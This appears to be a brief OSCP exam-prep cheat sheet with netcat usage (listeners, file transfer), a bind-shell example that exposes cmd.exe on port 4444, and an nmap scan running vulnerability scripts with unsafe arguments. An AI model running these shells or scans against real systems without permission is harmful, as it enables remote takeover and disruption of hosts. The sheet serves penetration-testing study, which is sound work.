# Go-For-OSCP

# Tips
<b>Enable service on every reboot:</b>

update-rc.d <[service]> enable

<b>Extract link from html page:</b>

cat index.html | grep "href=" | cut -d "/" -f3| grep "debian.org" | cut -d '"' -f1 | sort -u

# Netcat
<b>Interact with application:</b>

nc -nv <[IP]> <[PORT]>

<b>Listener:</b>

nc -nlvp <[PORT]>

<b>File transfer (client):</b>

nc -nlvp <[PORT]> > <[FILE]>

<b>File transfer (server):</b>

nc -nv <[IP]> <[PORT]> < <[FILE_TO_SEND]>

# Bind vs Reverse Shell

<img src="https://raw.github.com/SynAckPwn23/Go-For-OSCP/master/Bind_Reverse_shell.png" width="500"/>

<b>Bob needs Alice's help. Bob set up a listener on port 4444 with -e parameter:<b>

(BOB): nc -nlvp 4444 -e cmd.exe

<b>Alice connects to Bob's pc:<b>

(ALICE): nc -nv 10.11.17.9 4444







# Nmap
nmap -sS -sV -A -O --script="*-vuln-*" --script-args=unsafe=1 <[IP]>
